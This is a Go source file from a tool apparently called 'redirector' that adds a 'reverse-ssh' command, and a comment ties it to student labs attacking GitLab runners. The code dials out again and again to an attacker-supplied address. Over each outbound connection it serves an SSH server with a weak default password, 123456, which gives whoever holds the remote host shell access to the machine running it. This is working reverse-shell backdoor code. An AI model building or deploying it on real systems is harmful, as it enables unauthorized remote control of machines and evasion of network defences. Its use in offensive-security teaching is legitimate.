package app

import (
	"fmt"
	"github.com/spf13/cobra"
	"log"
	"net"
	"redirector/ssh"
	"runtime"
	"time"
)

func (a *App) ReverseSSH() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "reverse-ssh",
		Short:   "reverse ssh service",
		Aliases: []string{"revssh", "rev", "rs"},
		Args:    cobra.ExactArgs(1),
		Example: "./red revssh 1.2.3.4:2345",
	}

	cmd.Flags().StringP("password", "p", "123456", "ssh service password")

	cmd.RunE = a.ReverseSSHHandler
	return cmd
}

func (a *App) ReverseSSHHandler(cmd *cobra.Command, args []string) error {
	addr := args[0]

	password, err := cmd.Flags().GetString("password")

	if err != nil {
		return err
	}

	// linux 环境下强制必须使用-b参数进入后台, 本段主要为了学员在做Gitlab runner实验时忘加-b参数导致Gitlab Runner阻塞 影响其他学员实验
	if runtime.GOOS != "windows" && !a.background {
		return fmt.Errorf("must use -b parameter in linux environment")
	}

	log.Println("Forward SSH service to:", addr, "password:", password)

	// 限制最大20个连接
	maxConn := make(chan struct{}, 20)

	for {
		if conn, err := net.Dial("tcp", addr); err == nil {
			maxConn <- struct{}{}

			go func() {
				defer func() {
					<-maxConn
				}()

				if svr, err := ssh.NewSSHServer(password); err == nil {
					svr.HandleConn(conn)
				} else {
					log.Println(err)
				}
			}()
		} else {
			log.Println("cannot connect to rev host:", err)
			time.Sleep(time.Second * 3)
			continue
		}
	}
}
